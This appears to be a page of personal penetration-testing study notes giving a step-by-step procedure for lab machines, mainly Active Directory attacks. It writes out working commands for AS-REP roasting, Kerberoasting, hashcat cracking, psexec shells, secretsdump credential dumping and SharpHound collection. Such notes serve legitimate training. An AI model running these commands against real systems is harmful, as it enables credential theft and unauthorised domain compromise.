---
sidebar_position: 1
---

Sidenote: FTP are often unstable so if ftp / ftp files fails/corrupted go revert or smth!

## 1. Run begin.sh (basically autorecon)
<details>
While running, consider checking out HTTP ports. Document the general purpose of the site and any user flows. Do <a href="./general/Connecting">anonymous login</a> for any main services identified also.

If AD detected:
<details>
- Run dnsrecon
<details>
`dnsrecon -d <a machine> -r <subnet range /8>` (eg `dnsrecon -d 10.10.10.100 -r 10.0.0.0/8`)
</details>

- Check for AS-REP roasting
<details>
Run `impacket-GetNPUsers -dc-ip <domain controller ip>  -request -outputfile hashes.asreproast <domain>/<user>` (eg `impacket-GetNPUsers -dc-ip <domain controller ip> -request -outputfile hashes.asreproast corp.com/<user>`). Then run `hashcat --help | grep -i "Kerberos"` and find the AS-REP mode for hashcat (it should be 18200, if not change the mode in the next command), then run `sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
</details>

- (Requires user and plaintext password) Get a shell on victim
<details>
`impacket-psexec <domain>/<user>:<pw>@<dc ip>` Make sure its / not \. Also only works if the user has sufficient perms
</details>

- (Requires user and plaintext password) Check for Kerberoasting
<details>
`sudo impacket-GetUserSPNs -request -dc-ip <domain controller ip> <domain>/<user>` then `sudo hashcat -m 13100 <hash file> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
</details>

- (Requires user and plaintext password) [Not sure if should add to procedure cus depends on factor which might be v rare] Check for Domain Backup Abuse
<details>
`impacket-secretsdump -just-dc-user <target user> <domain>/<user w perms>:<password>@<ip>` (eg `impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70`)
</details>

- (Requires user and plaintext password) Bloodhound it from Windows VM
<details>
connect to the vpn on your windows vm. make sure u can ping the machine, then `.\SharpHound.exe -c all -d <domain> --domaincontroller <dc ip>`. if not working, go Control Panel > Network and Ethernet > Network and Sharing Center > Change adapter settings (on the left bar) > Right-click either and go to properties > doubleclick on IPv4 properties > Preferred DNS server change to the DC IP i think. if still dont work change the other ethernet/interface
</details>
</details>

If SMB detected: [SMB](/docs/general/SMB)

If fetched files from SMB or FTP, run filescanner from cybertools.
</details>

## 2. After nmap full port scan is done
<details>
List down all ports and prioritise which to look thru first.

Look thru full nmap scan for any definitive versions and add that to software/versions list.
</details>

## 3. After everything is done
<details>
- Check feroxbuster for HTTP ports
- Check patterns for any new identified software or CVEs
</details>

If found:

- NTLM hash: refer to [NTLM](/docs/procedure/NTLM)
- [AD](/docs/general/AD#enumeration)
- cpassword hash: `gpp-decrypt.py <hash>`

Errors:

- [Clock skew too great](https://medium.com/@danieldantebarnes/fixing-the-kerberos-sessionerror-krb-ap-err-skew-clock-skew-too-great-issue-while-kerberoasting-b60b0fe20069)

